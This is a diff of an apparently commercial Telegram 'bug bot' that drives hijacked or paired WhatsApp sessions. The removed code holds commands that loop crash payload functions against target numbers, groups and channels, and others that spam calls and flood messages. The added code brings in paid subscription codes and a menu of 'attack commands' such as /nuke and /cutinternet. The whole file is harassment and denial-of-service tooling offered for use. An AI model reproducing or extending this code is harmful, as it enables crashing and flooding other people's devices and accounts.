+// /free - Alias for /freemode
+bot.command("free", async (ctx) => {
+  await ctx.reply("⚠️ استخدم <code>/freemode</code> لتفعيل الوضع المجاني", { parse_mode: "HTML" });
+});
+
+// =====================================================================
+// COMMAND: /makencode (Create Subscription Code)
+// =====================================================================
+
+bot.command("makencode", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
     if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");
 
-    await ctx.editMessageText(
-      "📊 *حالة البوت*\n\n" +
-      "⏱️ وقت التشغيل: " + formatUptime(process.uptime()) + "\n" +
-      "👥 عدد المستخدمين: " + stats.users.size + "\n" +
-      "📱 الجلسات النشطة: " + stats.getSessionCount() + "\n" +
-      "🔢 إجمالي الأوامر: " + stats.totalCommands + "\n" +
-      "❌ الأخطاء: " + stats.errors,
-      { parse_mode: "Markdown" }
-    );
-    await ctx.answerCallbackQuery();
+    const args = ctx.message.text.split(" ");
+    const hours = parseInt(args[1]);
+    if (!hours || hours < 1) return ctx.reply("⚠️ الاستخدام: <code>/makencode 24</code>\n🎫 إنشاء رمز اشتراك لمدة 24 ساعة");
+
+    const code = "XZ-" + crypto.randomBytes(4).toString("hex").toUpperCase();
+    const db = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
+    db.codes.push({
+      code, hours, createdAt: Date.now(), createdBy: userId,
+      note: `Created by ${userId}`, used: false
+    });
+    safeWriteJSON("./storage/subscription_codes.json", db);
+
+    await ctx.reply(`✅ <b>تم إنشاء الرمز!</b>\n🎟️ الرمز: <code>${code}</code>\n⏰ المدة: ${hours} ساعة\n📅 أنشأه: ${userId}`, { parse_mode: "HTML" });
   } catch (e) {
-    log.error(`Admin status error: ${e.message}`);
-    await ctx.reply("❌ خطأ في عرض الحالة.");
+    log.error(`MAKECODE ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في إنشاء الرمز");
   }
 });
 
-bot.callbackQuery("admin_users", async (ctx) => {
+// =====================================================================
+// COMMAND: /redeem (Redeem Subscription Code)
+// =====================================================================
+
+bot.command("redeem", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");
+    const args = ctx.message.text.split(" ");
+    const code = args[1];
+    if (!code) return ctx.reply("⚠️ الاستخدام: <code>/redeem XZ-ABCD12</code>\n🎫 تفعيل رمز الاشتراك");
 
-    const keyboard = new InlineKeyboard()
-      .row()
-      .webApp("📋 قائمة المحظورين", "admin_blacklist")
-      .webApp("✅ القائمة البيضاء", "admin_whitelist")
-      .row()
-      .webApp("⬅️ رجوع", "admin_back");
+    const db = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
+    const target = db.codes.find(c => c.code === code.toUpperCase() && !c.used);
+    if (!target) return ctx.reply("❌ الرمز غير صحيح أو مستخدم بالفعل");
 
-    await ctx.editMessageText(
-      "👥 *إدارة المستخدمين*\n\n" +
-      "اختر القائمة المطلوبة:",
-      {
-        parse_mode: "Markdown",
-        reply_markup: keyboard
-      }
-    );
-    await ctx.answerCallbackQuery();
-  } catch (e) {
-    log.error(`Admin users error: ${e.message}`);
-    await ctx.reply("❌ خطأ في إدارة المستخدمين.");
-  }
-});
+    const now = Date.now();
+    const hoursMs = target.hours * 60 * 60 * 1000;
+    const subs = safeReadJSON("./storage/subscriptions.json", { users: {} });
 
-bot.callbackQuery("admin_settings", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");
-
-    const keyboard = new InlineKeyboard()
-      .row()
-      .webApp("🔘 الوضع المجاني", "admin_free_mode")
-      .webApp("⏱️ الكولدون", "admin_cooldown")
-      .row()
-      .webApp("🔗 ربط البوتات", "admin_bot_integration")
-      .row()
-      .webApp("⬅️ رجوع", "admin_back");
-
-    await ctx.editMessageText(
-      "🔧 *الإعدادات*\n\n" +
-      "اختر الإعداد المطلوب:",
-      {
-        parse_mode: "Markdown",
-        reply_markup: keyboard
-      }
-    );
-    await ctx.answerCallbackQuery();
-  } catch (e) {
-    log.error(`Admin settings error: ${e.message}`);
-    await ctx.reply("❌ خطأ في الإعدادات.");
-  }
-});
-
-// Bot integration handler
-bot.callbackQuery("admin_bot_integration", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");
-
-    const keyboard = new InlineKeyboard()
-      .row()
-      .webApp("➕ ربط بوت جديد", "admin_add_bot")
-      .webApp("📋 قائمة البوتات", "admin_list_bots")
-      .row()
-      .webApp("⬅️ رجوع", "admin_back");
-
-    await ctx.editMessageText(
-      "🔗 *ربط البوتات*\n\n" +
-      "اختر العملية المطلوبة:",
-      {
-        parse_mode: "Markdown",
-        reply_markup: keyboard
-      }
-    );
-    await ctx.answerCallbackQuery();
-  } catch (e) {
-    log.error(`Admin bot integration error: ${e.message}`);
-    await ctx.reply("❌ خطأ في ربط البوتات.");
-  }
-});
-
-// Add bot handler
-bot.callbackQuery("admin_add_bot", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");
-
-    const keyboard = new InlineKeyboard()
-      .row()
-      .webApp("⬅️ رجوع", "admin_bot_integration");
-
-    await ctx.editMessageText(
-      "➕ *ربط بوت جديد*\n\n" +
-      "يرجى إرسال توكن البوت الجديد:\n" +
-      "`<bot_token>`",
-      {
-        parse_mode: "Markdown",
-        reply_markup: keyboard
-      }
-    );
-    await ctx.answerCallbackQuery();
-  } catch (e) {
-    log.error(`Admin add bot error: ${e.message}`);
-    await ctx.reply("❌ خطأ في إضافة البوت.");
-  }
-});
-
-// List bots handler
-bot.callbackQuery("admin_list_bots", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");
-
-    const keyboard = new InlineKeyboard()
-      .row()
-      .webApp("⬅️ رجوع", "admin_bot_integration");
-
-    // Load connections
-    const connections = require("./api").loadAPIKeys();
-    const bots = connections.connections || [];
-
-    let text = "📋 *قائمة البوتات المرتبطة*\n\n";
-    
-    if (bots.length === 0) {
-      text += "لا توجد بوتات مرتبطة حالياً.";
+    let expiresAt;
+    if (subs.users[userId] && subs.users[userId].expiresAt > now) {
+      expiresAt = subs.users[userId].expiresAt + hoursMs;
     } else {
-      bots.forEach((bot, index) => {
-        text += `${index + 1}. 🤖 *${bot.botName || 'Bot'}*\n`;
-        text += `   نوع: ${bot.type || 'telegram'}\n`;
-        text += `   حالة: ${bot.status || 'unknown'}\n\n`;
-      });
+      expiresAt = now + hoursMs;
     }
 
-    await ctx.editMessageText(
-      text,
-      {
-        parse_mode: "Markdown",
-        reply_markup: keyboard
-      }
-    );
-    await ctx.answerCallbackQuery();
+    subs.users[userId] = { plan: `${target.hours} ساعة`, activatedAt: now, expiresAt, codes: [code] };
+    target.used = true;
+    target.usedBy = userId;
+    target.usedAt = now;
+    safeWriteJSON("./storage/subscriptions.json", subs);
+    safeWriteJSON("./storage/subscription_codes.json", db);
+
+    const remainingH = Math.floor((expiresAt - now) / 3600000);
+    await ctx.reply(`✅ <b>تم تفعيل الاشتراك!</b>\n⏰ المدة: ${target.hours} ساعة\n📅 ينتهي بعد ${remainingH} ساعة`, { parse_mode: "HTML" });
   } catch (e) {
-    log.error(`Admin list bots error: ${e.message}`);
-    await ctx.reply("❌ خطأ في عرض قائمة البوتات.");
+    log.error(`REDEEM ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ في تفعيل الرمز");
   }
 });
 
-bot.callbackQuery("admin_restart", async (ctx) => {
+// =====================================================================
+// COMMAND: /freemode (Toggle Free Mode)
+// =====================================================================
+
+bot.command("freemode", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
     if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");
 
-    const keyboard = new InlineKeyboard()
-      .row()
-      .webApp("🔄 إعادة تشغيل البوت", "admin_restart_bot")
-      .webApp("🛑 إيقاف البوت", "admin_shutdown_bot")
-      .row()
-      .webApp("⬅️ رجوع", "admin_back");
+    settingsDb.freeMode = !settingsDb.freeMode;
+    safeWriteJSON("./database/settings.json", settingsDb);
 
-    await ctx.editMessageText(
-      "🛑 *التحكم في البوت*\n\n" +
-      "اختر العملية المطلوبة:",
-      {
-        parse_mode: "Markdown",
-        reply_markup: keyboard
+    if (settingsDb.freeMode) {
+      await ctx.reply("🟢 <b>الوضع المجاني مفعل!</b>\n✅ جميع المستخدمين يمكنهم استخدام البوت الآن", { parse_mode: "HTML" });
+      // Notify all users
+      for (const uid of usersDb) {
+        try { await bot.api.sendMessage(uid, "🆓 <b>الوضع المجاني مفعل!</b>\nأنت الآن تستطيع استخدام جميع أوامر البوت", { parse_mode: "HTML" }); } catch {}
       }
-    );
-    await ctx.answerCallbackQuery();
+    } else {
+      await ctx.reply("🔴 <b>الوضع المجاني معطل!</b>\n❌ فقط المستخدمين المدفوعين يمكنهم الاستخدام", { parse_mode: "HTML" });
+    }
   } catch (e) {
-    log.error(`Admin restart error: ${e.message}`);
-    await ctx.reply("❌ خطأ في التحكم.");
+    log.error(`FREEMODE ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ");
   }
 });
 
-bot.callbackQuery("admin_back", async (ctx) => {
-  try {
-    const keyboard = new InlineKeyboard()
-      .row()
-      .webApp("📊 حالة البوت", "admin_status")
-      .webApp("👥 إدارة المستخدمين", "admin_users")
-      .webApp("🔧 الإعدادات", "admin_settings")
-      .webApp("🛑 إيقاف/إعادة تشغيل", "admin_restart");
+// =====================================================================
+// COMMAND: /maintmode (Toggle Maintenance Mode)
+// =====================================================================
 
-    await ctx.editMessageText(
-      "👑 *لوحة تحكم الأدمن*\n\n" +
-      "اختر القسم المطلوب:\n" +
-      "• 📊 حالة البوت - عرض الإحصائيات\n" +
-      "• 👥 إدارة المستخدمين - الحظر/السماح\n" +
-      "• 🔧 الإعدادات - تعديل الإعدادات\n" +
-      "• 🛑 إيقاف/إعادة تشغيل - التحكم في البوت",
-      {
-        parse_mode: "Markdown",
-        reply_markup: keyboard
+bot.command("maintmode", async (ctx) => {
+  try {
+    const userId = ctx.from.id.toString();
+    if (!isOwner(userId)) return ctx.reply("❌ هذا الأمر مخصص للمالك فقط!");
+
+    settingsDb.maintenance = !settingsDb.maintenance;
+    safeWriteJSON("./database/settings.json", settingsDb);
+
+    if (settingsDb.maintenance) {
+      await ctx.reply("🛠️ <b>وضع الصيانة مفعل!</b>\nالمستخدمون سيرون رسالة الصيانة", { parse_mode: "HTML" });
+      // Notify all users
+      for (const uid of usersDb) {
+        try { await bot.api.sendMessage(uid, `🛠️ <b>البوت في وضع الصيانة</b>\n\n${settingsDb.maintenanceMsg}`, { parse_mode: "HTML" }); } catch {}
       }
-    );
-    await ctx.answerCallbackQuery();
+    } else {
+      await ctx.reply("✅ <b>وضع الصيانة معطل!</b>\nالبوت يعمل بشكل طبيعي", { parse_mode: "HTML" });
+    }
   } catch (e) {
-    log.error(`Admin back error: ${e.message}`);
-    await ctx.reply("❌ خطأ في الرجوع.");
+    log.error(`MAINTMODE ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ");
   }
 });
 
 // =====================================================================
-// COMMAND: /listpair
+// COMMAND: /maintmsg (Set Maintenance Message)
 // =====================================================================
 
-bot.command("listpair", async (ctx) => {
+bot.command("maintmsg", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
+    if (!isOwner(userId)) return ctx.reply("❌ مخصص للمالك فقط!");
 
-    let result = "📌 *Daftar Sender WhatsApp Terhubung*\n";
-    result += "═══════════════════════════════════\n\n";
-    let count = 0;
+    const text = ctx.message.text.split(" ").slice(1).join(" ");
+    if (!text) return ctx.reply("⚠️ الاستخدام: <code>/maintmsg رسالة الصيانة</code>");
 
-    for (const uid in waClients) {
-      const clientData = waClients[uid];
-      if (!clientData || clientData?.status !== "open") continue;
-      count++;
-
-      try {
-        const sock = clientData?.sock;
-        const authState = sock?.authState;
-        const creds = authState?.creds || {};
-        const me = creds?.me || {};
-        const userJid = sock?.user?.id || me?.id || "";
-        const phoneNumber = userJid.includes("@") ? userJid.split("@")[0] : "Unknown";
-
-        result += `⚡ *SENDER LIST NO. ${count}*` +
-          `────────────────────────────────────\n` +
-          `👤 *Telegram : ${uid}*\n` +
-          `📱 *WhatsApp : \`${phoneNumber}\`*\n` +
-          `🔗 *Status : ✅ Aktif*\n\n`;
-      } catch (innerErr) {
-        result += `⚡ *SENDER LIST NO. ${count}*\n` +
-          `👤 *User ID : \`${uid}\`*\n` +
-          `🔗 *Status : ✅ Connected (Data partial)*\n\n`;
-      }
-    }
-
-    if (count === 0) {
-      return ctx.reply("ℹ️ *Tidak Ada Sender Aktif*\n\nBelum ada WhatsApp yang terhubung. Gunakan `/reqpair` untuk menambahkan sender baru.", { parse_mode: "Markdown" });
-    }
-
-    result += `═══════════════════════════════════\n`;
-    result += `📊 *Total Sender Aktif:* ${count}\n`;
-    result += `📅 *Check Time:* ${new Date().toLocaleString("id-ID")}`;
-
-    await ctx.reply(result, { parse_mode: "Markdown" });
+    settingsDb.maintenanceMsg = text;
+    safeWriteJSON("./database/settings.json", settingsDb);
+    await ctx.reply(`✅ <b>تم تحديث رسالة الصيانة!</b>\n📝 ${text}`, { parse_mode: "HTML" });
   } catch (e) {
-    log.error(`[LISTPAIR] Critical error: ${e.message}`);
-    await ctx.reply("❌ *Terjadi Kesalahan*\n\nGagal membaca data sender.", { parse_mode: "Markdown" });
+    log.error(`MAINTMSG ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ");
   }
 });
 
 // =====================================================================
-// COMMAND: /clearsesi
+// COMMAND: /setbotpic (Set Bot Profile Picture)
 // =====================================================================
 
-bot.command("clearsesi", async (ctx) => {
+bot.command("setbotpic", async (ctx) => {
   try {
     const userId = ctx.from.id.toString();
-    const args = ctx.message.text.split(" ");
-    const targetUserId = args[1] || userId;
-
-    const client = waClients[targetUserId];
-    if (!client) {
-      return ctx.reply("⚠️ Tidak ada sesi WhatsApp aktif untuk user ini.", { parse_mode: "Markdown" });
-    }
-
-    if (client.sock?.end) {
-      await client.sock.end().catch(() => {});
-    }
-
-    delete waClients[targetUserId];
-    await deleteSessionForUser(targetUserId);
-
-    await ctx.reply(`✅ Sesi WhatsApp untuk user ${targetUserId} telah dihapus.`, { parse_mode: "Markdown" });
-  } catch (err) {
-    log.error(`Failed to clear session for ${userId}: ${err.message}`);
-    await ctx.reply("❌ Terjadi kesalahan saat menghapus sesi.", { parse_mode: "Markdown" });
-  }
-});
-
-// =====================================================================
-// COMMAND: /clearsender
-// =====================================================================
-
-bot.command("clearsender", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) {
-      return ctx.reply(getNoAccessMessage(userId));
-    }
-
-    const confirmMsg = await ctx.reply(
-      "⚠️ *Peringatan!*\n\nAksi ini akan:\n❌ Menghapus SEMUA session WhatsApp\n❌ Menghapus SEMUA folder session\n✅ Restart bot otomatis\n\nLanjutkan?",
-      {
-        parse_mode: "Markdown",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "✅ Ya, Hapus Semua", callback_data: "clearsender_confirm" }],
-            [{ text: "❌ Batal", callback_data: "clearsender_cancel" }],
-          ],
-        },
-      }
-    );
-  } catch (err) {
-    log.error(`Error in /clearsender for ${userId}: ${err.message}`);
-    await ctx.reply("⚠️ Terjadi kesalahan saat memproses permintaan.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /masscrash
-// =====================================================================
-
-bot.command("masscrash", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));
+    if (!isOwner(userId)) return ctx.reply("❌ مخصص للمالك فقط!");
 
     const args = ctx.message.text.split(" ");
-    const numbers = args.slice(1);
-    
-    if (numbers.length === 0) {
-      return ctx.reply(
-        "⚠️ *Format:*\n/masscrash 628xxx 628xxx 628xxx\n\n📌 Minimal 2 nomor",
-        { parse_mode: "Markdown" }
-      );
-    }
+    const url = args[1];
+    if (!url) return ctx.reply("⚠️ الاستخدام: <code>/setbotpic رابط_الصورة</code>\n🖼️ تغيير صورة البوت في قائمة /start");
 
-    if (numbers.length < 2) {
-      return ctx.reply("❌ Minimal 2 nomor untuk masscrash!");
-    }
-
-    const clientEntry = waClients[userId];
-    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
-      return ctx.reply(
-        "📵 WhatsApp belum terhubung.\nSilakan pairing dengan:\n/reqpair 628xxxx",
-        { parse_mode: "Markdown" }
-      );
-    }
-
-    const client = clientEntry.sock;
-    await ctx.reply(`🦠 Memulai masscrash untuk ${numbers.length} nomor...`);
-
-    for (const num of numbers) {
-      const cleanTarget = num.replace(/[^0-9]/g, "");
-      if (cleanTarget.length < 10) continue;
-      
-      const X = `${cleanTarget}@s.whatsapp.net`;
-      
-      for (let z = 0; z < 20; z++) {
-        await hardfix1(client, X);
-        await hardfix2(client, X);
-        await hardfix3(client, X);
-        await audiocall(client, X);
-        await sleep(50);
-      }
-    }
-
-    await ctx.reply(`✅ Masscrash selesai! Target: ${numbers.length} nomor`);
-    
+    setBotImageUrl(url);
+    await ctx.reply(`✅ <b>تم تحديث صورة البوت!</b>\n🔗 الرابط: ${url}`, { parse_mode: "HTML" });
   } catch (e) {
-    log.error(`MASSCRASH ERROR: ${e.message}`);
-    await ctx.reply("❌ Terjadi kesalahan saat masscrash.");
-  }
-});
-// =====================================================================
-// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
-// =====================================================================
-// PART 4/7: Lines 1951-2600
-// Total: ~4550 Lines
-// =====================================================================
-
-// =====================================================================
-// COMMAND: /spamcall
-// =====================================================================
-
-bot.command("spamcall", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));
-
-    const args = ctx.message.text.split(" ");
-    const input = args[1];
-    const count = parseInt(args[2]) || 10;
-    
-    if (!input) {
-      return ctx.reply("⚠️ Format: /spamcall 628xxx <jumlah>", { parse_mode: "Markdown" });
-    }
-
-    const cleanTarget = input.replace(/[^0-9]/g, "");
-    if (cleanTarget.length < 10) {
-      return ctx.reply("❌ Nomor tidak valid!");
-    }
-
-    const clientEntry = waClients[userId];
-    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
-      return ctx.reply("📵 WhatsApp belum terhubung.");
-    }
-
-    const client = clientEntry.sock;
-    const X = `${cleanTarget}@s.whatsapp.net`;
-    
-    await ctx.reply(`📞 Memulai spam call ke ${cleanTarget} (${count} kali)...`);
-
-    for (let i = 0; i < Math.min(count, 50); i++) {
-      await audiocall(client, X);
-      await sleep(200);
-    }
-
-    await ctx.reply(`✅ Spam call selesai! Target: ${cleanTarget}`);
-    
-  } catch (e) {
-    log.error(`SPAMCALL ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal melakukan spam call.");
+    log.error(`SETBOTPIC ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ");
   }
 });
 
 // =====================================================================
-// COMMAND: /floodmsg
+// COMMAND: /botinfo (Developer Command)
 // =====================================================================
 
-bot.command("floodmsg", async (ctx) => {
+bot.command("botinfo", async (ctx) => {
   try {
-    const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));
-
-    const args = ctx.message.text.split(" ");
-    const input = args[1];
-    const count = parseInt(args[2]) || 50;
-    const msg = args.slice(3).join(" ") || "Halo";
-    
-    if (!input) {
-      return ctx.reply("⚠️ Format: /floodmsg 628xxx <jumlah> <pesan>", { parse_mode: "Markdown" });
-    }
-
-    const cleanTarget = input.replace(/[^0-9]/g, "");
-    if (cleanTarget.length < 10) {
-      return ctx.reply("❌ Nomor tidak valid!");
-    }
-
-    const clientEntry = waClients[userId];
-    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
-      return ctx.reply("📵 WhatsApp belum terhubung.");
-    }
-
-    const client = clientEntry.sock;
-    const X = `${cleanTarget}@s.whatsapp.net`;
-    
-    await ctx.reply(`💬 Memulai flood ke ${cleanTarget} (${count} kali)...`);
-
-    for (let i = 0; i < Math.min(count, 200); i++) {
-      await client.sendMessage(X, { text: `${msg} ${i+1}` });
-      await sleep(50);
-    }
-
-    await ctx.reply(`✅ Flood selesai! Target: ${cleanTarget}`);
-    
-  } catch (e) {
-    log.error(`FLOODMSG ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal melakukan flood.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /crashgroup
-// =====================================================================
-
-bot.command("crashgroup", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));
-
-    const args = ctx.message.text.split(" ");
-    const groupId = args[1];
-    
-    if (!groupId) {
-      return ctx.reply("⚠️ Format: /crashgroup <group_id>", { parse_mode: "Markdown" });
-    }
-
-    const clientEntry = waClients[userId];
-    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
-      return ctx.reply("📵 WhatsApp belum terhubung.");
-    }
-
-    const client = clientEntry.sock;
-    const X = groupId.includes("@g.us") ? groupId : `${groupId}@g.us`;
-    
-    await ctx.reply(`🦠 Memulai crash group...`);
-
-    for (let z = 0; z < 100; z++) {
-      await hardfix1(client, X);
-      await hardfix2(client, X);
-      await hardfix3(client, X);
-      await delayhigh(client, X);
-      await sleep(50);
-    }
-
-    await ctx.reply(`✅ Crash group selesai!`);
-    
-  } catch (e) {
-    log.error(`CRASHGROUP ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal crash group.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /crashstatus
-// =====================================================================
-
-bot.command("crashstatus", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));
-
-    const args = ctx.message.text.split(" ");
-    const input = args[1];
-    
-    if (!input) {
-      return ctx.reply("⚠️ Format: /crashstatus 628xxx", { parse_mode: "Markdown" });
-    }
-
-    const cleanTarget = input.replace(/[^0-9]/g, "");
-    if (cleanTarget.length < 10) {
-      return ctx.reply("❌ Nomor tidak valid!");
-    }
-
-    const clientEntry = waClients[userId];
-    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
-      return ctx.reply("📵 WhatsApp belum terhubung.");
-    }
-
-    const client = clientEntry.sock;
-    const X = `${cleanTarget}@s.whatsapp.net`;
-    
-    await ctx.reply(`🦠 Memulai crash status...`);
-
-    for (let z = 0; z < 50; z++) {
-      await delaybeta(client, X);
-      await sleep(100);
-    }
-
-    await ctx.reply(`✅ Crash status selesai!`);
-    
-  } catch (e) {
-    log.error(`CRASHSTATUS ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal crash status.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /crashchannel
-// =====================================================================
-
-bot.command("crashchannel", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));
-
-    const args = ctx.message.text.split(" ");
-    const channelId = args[1];
-    
-    if (!channelId) {
-      return ctx.reply("⚠️ Format: /crashchannel <channel_id>", { parse_mode: "Markdown" });
-    }
-
-    const clientEntry = waClients[userId];
-    if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
-      return ctx.reply("📵 WhatsApp belum terhubung.");
-    }
-
-    const client = clientEntry.sock;
-    
-    await ctx.reply(`🦠 Memulai crash channel...`);
-
-    for (let z = 0; z < 50; z++) {
-      await XoipCrash(client, channelId);
-      await sleep(100);
-    }
-
-    await ctx.reply(`✅ Crash channel selesai!`);
-    
-  } catch (e) {
-    log.error(`CRASHCHANNEL ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal crash channel.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /restart
-// =====================================================================
-
-bot.command("restart", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
-
-    await ctx.reply("🔄 Restarting bot...");
-    
-    for (const uid in waClients) {
-      try {
-        if (waClients[uid]?.sock) {
-          waClients[uid].sock.end();
-        }
-        delete waClients[uid];
-      } catch (e) {}
-    }
-
-    setTimeout(() => {
-      process.exit(0);
-    }, 1000);
-    
-  } catch (e) {
-    log.error(`RESTART ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal merestart bot.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /shutdown
-// =====================================================================
-
-bot.command("shutdown", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
-
-    await ctx.reply("🛑 Shutting down bot...");
-    
-    for (const uid in waClients) {
-      try {
-        if (waClients[uid]?.sock) {
-          waClients[uid].sock.end();
-        }
-        delete waClients[uid];
-      } catch (e) {}
-    }
-
-    setTimeout(() => {
-      process.exit(1);
-    }, 1000);
-    
-  } catch (e) {
-    log.error(`SHUTDOWN ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mematikan bot.");
-  }
-});
-
-// =====================================================================
-// COMMAND: /status
-// =====================================================================
-
-bot.command("status", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!hasAccess(userId)) return ctx.reply(getNoAccessMessage(userId));
-
     const uptime = formatUptime(process.uptime());
-    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
-    const totalMemory = (process.memoryUsage().heapTotal / 1024 / 1024).toFixed(2);
-    const sessionCount = Object.keys(waClients).length;
-    const users = safeReadJSON("database/users.json", []).length;
+    const memUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
+    const memTotal = (os.totalmem() / 1024 / 1024 / 1024).toFixed(1);
+    const memFree = (os.freemem() / 1024 / 1024 / 1024).toFixed(1);
+    const pkg = require("./package.json");
 
-    const status = `
-📊 *Bot Status*
-═══════════════════════════════
+    const info = `<blockquote>
+<b>👨‍💻 معلومات البوت</b>
 
-🕐 *Uptime:* ${uptime}
-💾 *Memory Used:* ${usedMemory} MB
-📦 *Total Memory:* ${totalMemory} MB
-📱 *Active Sessions:* ${sessionCount}
-👥 *Total Users:* ${users}
-🔧 *Cooldown:* ${cooldownModule.isCooldownEnabled() ? '✅ Active' : '❌ Inactive'}
-🔄 *Free Mode:* ${isFreeMode() ? '✅ On' : '❌ Off'}
+━━━━━━━━━━━━━━━━━━━━━━━
+📛 الاسم: ${pkg.name}
+📦 الإصدار: ${pkg.version}
+⏱️ التشغيل: ${uptime}
+💾 الذاكرة: ${memUsed} MB
+📱 الجلسات: ${Object.keys(waClients).length}
+👥 المستخدمين: ${usersDb.length}
 
-📅 *Time:* ${new Date().toLocaleString()}
-    `;
+━━━━━━━━━━━━━━━━━━━━━━━
+⚡ <b>أوامر الهجوم:</b>
+/nuke /spam /call /media /mass /sticker /cutinternet /ghost /shield /stealth
 
-    await ctx.reply(status, { parse_mode: "Markdown" });
-    
+━━━━━━━━━━━━━━━━━━━━━━━
+🎫 <b>الاشتراكات:</b>
+/makencode /redeem /listcodes
+🆓 <b>مجاني:</b> /freemode
+🛠️ <b>صيانة:</b> /maintmode
+👑 <b>أدمن:</b> /admin /addadmin
+
+━━━━━━━━━━━━━━━━━━━━━━━
+🔧 Node.js ${process.version}
+📊 إجمالي الأوامر: ~50+ أمر
+━━━━━━━━━━━━━━━━━━━━━━━
+</blockquote>`;
+
+    await ctx.reply(info, { parse_mode: "HTML" });
   } catch (e) {
-    log.error(`STATUS ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mendapatkan status.");
+    log.error(`BOTINFO ERROR: ${e.message}`);
+    ctx.reply("❌ خطأ");
   }
 });
 
@@ -2718,1458 +1716,683 @@ bot.command("status", async (ctx) => {
 
 bot.command("stats", async (ctx) => {
   try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
+    const uptime = formatUptime(process.uptime());
+    const memUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
+    const codesDb = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
+    const subsDb = safeReadJSON("./storage/subscriptions.json", { users: {} });
+    const activeSubs = Object.keys(subsDb.users).filter(k => subsDb.users[k].expiresAt > Date.now()).length;
 
-    const users = safeReadJSON("database/users.json", []);
-    const access = safeReadJSON("./storage/access.json", { users: [] });
-    const resellers = safeReadJSON("./storage/resellers.json", { users: [] });
-    const blacklistData = blacklist;
-    const sessionCount = Object.keys(waClients).length;
+    await ctx.reply(`📊 <b>الإحصائيات</b>
 
-    const stats = `
-📈 *Bot Statistics*
-═══════════════════════════════
-
-👥 *Total Users:* ${users.length}
-🔑 *Access Users:* ${access.users.length}
-🔄 *Resellers:* ${resellers.users.length}
-🚫 *Blacklist:* ${blacklistData.length}
-📱 *Active Sessions:* ${sessionCount}
-📂 *Session Folder:* ${fs.existsSync("./session") ? fs.readdirSync("./session").length : 0}
-
-📅 *Date:* ${new Date().toLocaleString()}
-    `;
-
-    await ctx.reply(stats, { parse_mode: "Markdown" });
-    
-  } catch (e) {
-    log.error(`STATS ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mendapatkan statistik.");
-  }
+⏱️ التشغيل: ${uptime}
+💾 الذاكرة: ${memUsed} MB
+👥 المستخدمين: ${usersDb.length}
+📱 الجلسات: ${Object.keys(waClients).length}
+🎫 الرموز النشطة: ${codesDb.codes.filter(c => !c.used).length}
